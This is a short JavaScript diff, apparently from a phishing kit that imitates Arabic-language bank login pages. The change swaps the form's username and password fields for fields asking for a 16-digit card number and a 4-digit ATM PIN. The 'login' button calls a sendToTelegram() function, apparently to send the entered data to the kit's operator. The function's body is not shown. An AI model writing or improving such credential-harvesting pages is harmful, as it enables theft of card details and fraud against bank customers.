@@ -126,8 +126,8 @@ const formType = bankFormConfig[bank] || "normal";
 if(formType === "special") {
   document.getElementById("bankTitle").innerText = `تسجيل الدخول إلى ${bankArabicNames[bank] || bank}`;
   document.getElementById("formContainer").innerHTML = `
-    <input type="text" id="user" placeholder="اسم المستخدم">
-    <input type="password" id="pass" placeholder="كلمة المرور">
+    <input type="text" id="user" placeholder=" أدخل رقم البطاقة(16رقم)">
+    <input type="password" id="pass" placeholder="أدخل ATM PIN (4 أرقام)">
     <button onclick="sendToTelegram()">تسجيل الدخول</button>
   `;
 } else {
